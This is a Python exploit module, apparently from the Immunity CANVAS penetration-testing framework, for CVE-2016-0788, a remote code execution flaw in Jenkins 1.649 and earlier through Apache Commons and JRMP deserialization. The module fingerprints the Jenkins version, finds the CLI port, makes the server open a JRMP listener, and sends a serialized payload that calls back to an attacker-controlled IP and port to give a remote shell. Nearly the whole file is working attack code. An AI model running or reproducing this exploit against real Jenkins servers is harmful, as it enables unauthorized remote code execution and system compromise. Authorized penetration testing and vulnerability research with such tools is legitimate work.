#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path:
    sys.path.append(".")

import logging
import os
import base64
import struct
import socket
import re
import ast
from libs.java_payload_modifiers import JavaPayloadModifiers

from urllib import quote
from time import sleep


import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy

from libs.request_replay import get_ordered_requests
from libs.jrmp_deserialize import objectcreator

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "jenkins_jrmp_deserialization"
DESCRIPTION                     = "Jenkins pre-1.650 Apache Commons pre-3.2.2 + JRMP Deserialization Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Jenkins"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2016-0788"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0788"
DOCUMENTATION['References']     = ['https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-02-24',]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['VERSION']             = ["1.598", "1.637", "1.649"]

DOCUMENTATION['NOTES'] = """

Versions tested:

> Ubuntu Linux 14.04.3
Jenkins 1.598 - 6 / 7 / 8
Jenkins 1.649 - 7 / 8
> Windows 7 Ultimate SP1
Jenkins 1.598 - 6 / 7 / 8
Jenkins 1.637 - 7 / 8


"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8080
        self.jrmp_port          = 8675
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False

        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.content_type       = ""


        self.targetpath         = "/"


        # MOSDEF options
        self.autoFind = False

        self.version_re = re.compile("Jenkins ver\. (?P<version>[\d\.]+)\<")


        return

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.jrmp_port = int(self.argsDict.get("jrmp_port", self.jrmp_port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return

    def send_jboss_request(self, payload=None):
        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)

        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        host_field = "%s:%s" % (self.hostname, self.port)

        self.ua.addHeader("Host", host_field)

        data = None
        if payload != None:
            data = self.ua.POST(self.targetpath, payload, extraheaders=None, noresponse=True)
        else:

            data = self.ua.GET(self.targetpath, noresponse=False)

        return data

    def get_jenkins_info(self):
        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)

        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath

        host_field = "%s:%s" % (self.hostname, self.port)

        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        self.ua.addHeader("Host", host_field)

        (response, response_code) = self.ua.GET(self.targetpath, noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        version = self.extract_regex_result(response, self.version_re, "version")
        if self.version_test(version):
            return_value = None
            if 299 < response_code or response_code < 200:
                pass
            else:
                for line in response.split("\r\n"):
                    if "X-Jenkins-CLI-Port" in line:
                        field = line.split(":")
                        return_value = int(field[1])
                        break

            return return_value
        else:
            return None

    def jenkins_string(self, string):
        return struct.pack(">H", len(string)) + string

    def version_test(self, version):
        choice = False
        if version != None:
            choice = version <= "1.649"

        return choice

    def test(self):
        self.getargs()

        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)

        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath

        host_field = "%s:%s" % (self.hostname, self.port)

        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        self.ua.addHeader("Host", host_field)

        (response, response_code) = self.ua.GET(self.targetpath, noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        version = self.extract_regex_result(response, self.version_re, "version")

        return self.version_test(version)


    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)

        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]

    def send_binary(self, sock, byte_list):
        return sock.sendall("".join([chr(byte) for byte in byte_list]))

    def welcome_recv(self, sock):
        resp = []
        state = 0

        # 4 NULLs for 'channel is binary'
        nulls = 0

        while True:
            tmp = sock.recv(1)
            resp.append(tmp)

            if state == 0:
                if tmp == ">":
                    state = 1
            if state == 1:
                if tmp == "=":
                    state = 2
            else:
                if tmp == "\x00":
                    nulls += 1
                if nulls >= 4:
                    break

        return "".join(resp)

    def cli_request(self, sock, request=[]):
        # self.send_binary(sock, request)
        sock.sendall(request)
        first_word = sock.recv(2)

        if first_word == "We":
            response = self.welcome_recv(sock)
            return first_word + response
        else:
            response_length = struct.unpack(">H", first_word)[0]
            response_buffer = [first_word]

            receive_count = 0

            while receive_count < response_length:
                response = sock.recv(response_length - receive_count)

                response_buffer.append(response)
                receive_count += len(response)

            return "".join(response_buffer)

    def replace_int(self, data, needle, int_value):
        start_idx = data.find(needle)
        end_idx = start_idx + len(needle)

        return data[:start_idx] + struct.pack(">L", int_value) + data[end_idx:]

    def create_open_jrmp_request(self, data, listen_ip="0.0.0.0", listen_port=5555):
        data = JavaPayloadModifiers.replace_string(data, "LISTEN_IP", listen_ip)
        len_1 = len(data)
        data = self.replace_int(data, "\x00\x33\x33\x33", listen_port)
        len_2 = len(data)
        data = self.replace_int(data, "\x00\x34\x35\x36", listen_port)
        len_3 = len(data)

        return data

    def open_jrmp(self, cli_port=None, arg_jrmp_port=None):
        sock = self.gettcpsock()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
        sock.connect((self.hostname, cli_port))

        request_list = get_ordered_requests(os.path.join(os.path.dirname(__file__),
                                                         "Resources"),
                                                         "cli_request")

        response = None

        for request_path in request_list:
            request_data = "".join([chr(x) for x in ast.literal_eval(open(request_path, "rb").read())])


            if "ActivationGroup" in request_data:
                self.log("asking Jenkins to bind a JRMP instance on port %s:%d" % (self.hostname, arg_jrmp_port))
                request_data = self.create_open_jrmp_request(request_data,
                                                             "localhost",
                                                             arg_jrmp_port)

            tmp_response = self.cli_request(sock, request_data)

            if "objID" in tmp_response:
                response = tmp_response

        sock.close()

        time.sleep(5)

        return self.get_call_info(response)

    # Get the ObjID needed to execute a JRMP call
    def get_call_info(self, data):
        OBJID_START = "objID:["
        objid_start_idx = data.find(OBJID_START)
        objid_end_idx = data.find("]", objid_start_idx)

        components = []

        objid_str = data[objid_start_idx+len(OBJID_START):objid_end_idx+1].strip("]").strip("[")
        first_split = objid_str.split(":")
        second_split = first_split[-1].split(", ")

        components.append(int(first_split[0],16))
        components.append(int(first_split[1],16))
        components.append(int(second_split[0],16))
        components.append(int(second_split[1]))

        return [struct.pack(">q", components[3]),
                struct.pack(">i", components[0]),
                struct.pack(">q", components[1]),
                struct.pack(">h", components[2])]

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
        self.log("Using version: %s" % self.version)

        cli_port = self.get_jenkins_info()
        failed = True

        if cli_port != None:
            self.log("Grabbed Jenkins CLI protocol V1 port:%d" % cli_port)

            self.setProgress(25)

            call_info = self.open_jrmp(cli_port, self.jrmp_port)

            # Load the Apache Commons object through RMI
            payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=self.needs_mosdef_http(),
                                    use_ssl=False).get_payload(call_info)


            sock = self.gettcpsock()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
            sock.connect((self.hostname, self.jrmp_port))

            self.log("connected to JRMP socket on %s:%d" % (self.hostname, self.jrmp_port))

            sock.sendall(payload)

            self.log("sent MOSDEF payload")
            sock.close()

            self.setProgress(100)
            failed = False

        return 1 if not failed else 0

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
